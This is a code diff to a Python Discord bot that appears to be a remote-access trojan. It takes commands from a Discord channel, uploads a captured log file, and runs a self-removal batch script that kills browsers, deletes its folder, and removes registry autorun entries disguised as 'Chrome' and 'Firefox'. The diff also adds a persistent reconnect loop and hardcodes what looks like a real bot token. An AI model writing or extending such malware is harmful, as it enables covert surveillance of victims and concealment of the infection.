@@ -81,12 +81,15 @@ async def on_message(message):
                 elif command == 'LOG':
                     await message.channel.send(file=discord.File(os.path.join(airsoft, 'log.txt')))
                 elif command == 'DELETE':
-                    filename = __file__.split('\\')[-1]
                     with open(os.path.join(os.environ['appdata'], 'uninst.bat'), 'w') as file:
+                        file.write(f'@echo OFF\n')
                         file.write(f'taskkill /f /im "Google Chrome.exe"\n')
                         file.write('taskkill /f /im "Firefox.exe"\n')
                         file.write(f'rd /s /q {airsoft}\n')
-                        file.write(f'del /f /s /q "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"\n')
+                        file.write(f'echo Y | reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Chrome"\n')
+                        file.write(f'echo Y | reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Firefox"\n')
+                        file.write(f'del /f /s /q "%USERPROFILE%\AppData\Local\Google\Chrome\Chrome Engine"\n')
+                        file.write(f'rmdir "%USERPROFILE%\AppData\Local\Google\Chrome\Chrome Engine"\n')
                         file.write('CMD /C DEL %0')
                         file.close()
                     os.system(os.path.join(os.environ['appdata'], 'uninst.bat'))
@@ -95,5 +98,8 @@ async def on_message(message):
     except Exception as Error:
         await message.channel.send(Error)
 
-
-client.run('ODcyNTcwNzgyMjU2MDc0ODUy.YQry3g.Hxn4LFsaSEvBoCB6MdB001ZUYK0')
+while True:
+    try:
+        client.run('ODcyNTcwNzgyMjU2MDc0ODUy.YQry3g.Hxn4LFsaSEvBoCB6MdB001ZUYK0')
+    except:
+        time.sleep(30)
